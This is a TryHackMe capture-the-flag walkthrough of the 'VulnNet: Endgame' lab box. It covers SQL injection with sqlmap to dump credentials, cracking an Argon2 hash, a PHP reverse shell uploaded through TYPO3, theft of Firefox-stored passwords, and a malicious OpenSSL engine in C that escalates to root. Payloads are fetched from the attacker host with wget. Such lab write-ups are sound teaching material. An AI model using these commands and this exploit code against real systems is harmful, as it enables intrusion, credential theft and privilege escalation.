# VulnNet: Endgame – TryHackMe Writeup

**Table of Contents**
1. [Overview](#overview)  
2. [Initial Enumeration](#initial-enumeration)  
3. [Subdomain Discovery/SQL Injection/chris_w](#subdomain-discovery--sql-injection)  
4. [Cracking `chris_w`’s Argon2 Hash](#cracking-argon2-hash)  
5. [CMS Shell Upload – `www-data`](#cms-shell-upload)  
6. [Privilege Escalation to `system`](#privilege-escalation-to-system)  
7. [Privilege Escalation to `root`](#privilege-escalation-to-root)  

---

## 1. Overview

**VulnNet: Endgame** is a medium‑difficulty machine emphasizing enumeration over puzzles. You start with HTTP and SSH access, discover a CMS and API subdomain vulnerable to SQL injection, escalate via CMS webshell, then climb to `system` and `root` using Firefox decrypt and SUID openssl abuse.

---

## 2. Initial Enumeration(NMAP & Service)

- Run **nmap**:
  ```bash
  nmap -A -Pn -sC -sV -p- 10.10.148.12 -oN full_scan.txt
  ```

**Key output:**

* Open ports:

  * `22/tcp` SSH (OpenSSH 7.6p1 on Ubuntu 18.04)
  * `80/tcp` HTTP (Apache 2.4.29)

---

### Host Header & Subdomain Enumeration

```bash
# Add main domain resolution
echo "10.10.148.12 vulnnet.thm" | sudo tee -a /etc/hosts
```

### Fuzzing for subdomains:

```bash
# Using ffuf to enumerate subdomains via Host header
ffuf -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 65
```

Discovered alot of different subdomains but main ones to look at are: `api`, `blog`, `shop`, `admin1` 

Add them to `/etc/hosts`. Ex: `sudo nano /etc/hosts` , `10.10.148.12   api.vulnnet.thm` | add all of them.

---

## 3. Directory Enumeration on `admin1.vulnnet.thm`

```bash
gobuster dir -u http://admin1.vulnnet.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php
```

**Found directories:**

* `/fileadmin`
* `/typo3` (CMS login portal) 

---

## Discovering SQL Injection on the Blog API

* Browsed blog posts → observed JavaScript call to:

  ```
  http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1
  ```
* You have to view page source of the first blog post and scroll all the way down to the bottom to see the javascript call

* Testing for injection:

  ```bash
  curl "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' OR '1'='1"
  ```
---

## Automated SQL Injection with sqlmap

**List databases**:

   ```bash
   sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" --batch --dbs
   ```
   → Detected: `blog`, `information_schema`, `vn_admin`

**Enumerate `vn_admin.be_users` table**:

   ```bash
   sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -D vn_admin --tables
   sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -D vn_admin -T be_users --columns
   ```

**Extract `username` + `password` (Argon2 hash)**:

   ```bash
   sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -D vn_admin -T be_users -C username,password --dump
   ```

   → Retrieved `chris_w` with Argon2 hash
   
**Dump blog user credentials**:

   ```bash
   sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -D blog -T users -C username,password --dump
   ```

   → Saved full user/password list to `users.csv`

---

## 4. Cracking the `chris_w` Argon2i Hash

### Dumped Hash

From SQLi on the `vn_admin.be_users` table:

```text
chris_w:$argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg
````

### Extracting potential passwords

We leveraged SQLi on the `blog.users` table to extract all plaintext user passwords:

```bash
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" \
  -p blog --dbms=mysql -D blog -T users -C password --dump \
  --batch > blog_users_passwords.txt
cut -d',' -f2 blog_users_passwords.txt | tail -n +2 > passlist.txt
```

### Cracking using John the Ripper

John (with GPU support) supports Argon2i via OpenCL modules:

```bash
john --format=argon2-opencl --wordlist=passlist.txt chris_w.hash
```

This recovers the plaintext password for `chris_w`.

> **Why John?**
> John recently gained Argon2 support for GPU/OpenCL and can handle high-memory hashes like Argon2i.

---

## 5. CMS Shell Upload via TYPO3

### Discovery

* Located TYPO3 backend at `http://admin1.vulnnet.thm/typo3/`
* Enumerated via `gobuster` and confirmed CMS presence

### Upload Workflow

\*\*Disable file upload filtering\*\*
   In TYPO3 backend:
   `Admin Tools → Settings → [fileDenyPattern]`
   Clear filters and save.

**Upload reverse-shell**
   Use a PHP shell like `php-reverse-shell.php` via `Filelist → Upload file`.

**Trigger shell & gain reverse connection**

```bash
# On attacker:
nc -lvnp 443

# On target (after upload):
curl http://admin1.vulnnet.thm/fileadmin/user_upload/php-reverse-shell.php
```

**Stabilize to a real shell**:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 6. Privilege Escalation → `system`

Once you’ve acquired a reverse shell as `www-data`, perform enumeration to identify local users and credentials:

```bash
www-data@vulnnet-endgame:/$ cat /etc/passwd | cut -d: -f1
```

Check for accessible credentials or config files—particularly, look at the TYPO3 and API configuration:

```bash
www-data@…:/var/www/html/admin1/typo3conf$ grep -R "password" .
LocalConfiguration.php: 'password' => 'q2SbGTnSSWB95',
...
/var/www/html/api/index.php:$password = "q2SbGTnSSWB95";
```

The MySQL password appears to be `q2SbGTnSSWB95`, but it didn’t work for `su system`.

Next, enumerate the `system` user’s home directory:

```bash
www-data@…:/home/system$ ls -lah
drwxr-xr-x 4 system system .mozilla
```

This reveals Firefox profile data. Using `zip` and `python3 -m http.server 8001`, download the `.mozilla` folder and decrypt saved credentials using `https://github.com/unode/firefox_decrypt`:

```text
Website:   https://tryhackme.com
Username: 'chris_w@vulnnet.thm'
Password: 'I-wont-be-listing-the-password-find-it-yourself'
```

These are the credentials for `system`. Back in your shell, `ssh` into the machine as `system` with `password`:
```bash
ssh system@10.10.148.12
```

---

## 7. Privilege Escalation → `root`

Ensure you’re operating as `system`:

```bash
system@vulnnet-endgame:~$ whoami && id
system uid=1000(system) gid=1000(system) groups=1000(system)
```

### Upload LinPEAS for Capability Discovery

In your local Kali attack machine (`10.13.86.132`):

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
python3 -m http.server 8003
```

On the target (`system@10.10.148.12`), in your `Utils` directory:

```bash
system@vulnnet-endgame:~/Utils$ wget http://10.13.86.132:8003/linpeas.sh
system@...:~/Utils$ chmod +x linpeas.sh
system@...:~/Utils$ ./linpeas.sh | tee linpeas_scan.txt
```

Scan reveals:

```
/home/system/Utils/openssl = cap_setuid+ep
```

That confirms OpenSSL is runnable with elevated privileges.

### Develop the Exploit on Kali

Install build tools and create the exploit source:

```bash
sudo apt update && sudo apt install libssl-dev gcc
cat << 'EOF' > openssl-exploit-engine.c
#include <openssl/engine.h>
static int bind(ENGINE *e, const char *id) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 1;
}
IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
EOF
```

Compile into a shared object:

```bash
gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o
```

Host the compiled engine:

```bash
python3 -m http.server 8004
```

### Transfer & Execute Exploit on Target

On the target machine (`system@...:/home/system/Utils`), download and exploit:

```bash
system@vulnnet-endgame:~/Utils$ wget http://10.13.86.132:8004/openssl-exploit-engine.so
system@...:~/Utils$ chmod +r openssl-exploit-engine.so
system@...:~/Utils$ ./openssl req -engine ./openssl-exploit-engine.so
```

This command loads the malicious engine, it triggers `setuid(0)` + `system("/bin/bash")`, giving you a **root shell**.

### Validate Root & Capture Flag

Check you're root and read the flag:

```bash
root@vulnnet-endgame:/home/system/Utils# whoami && id
root uid=0(root) gid=0(root) groups=0(root)
```

---



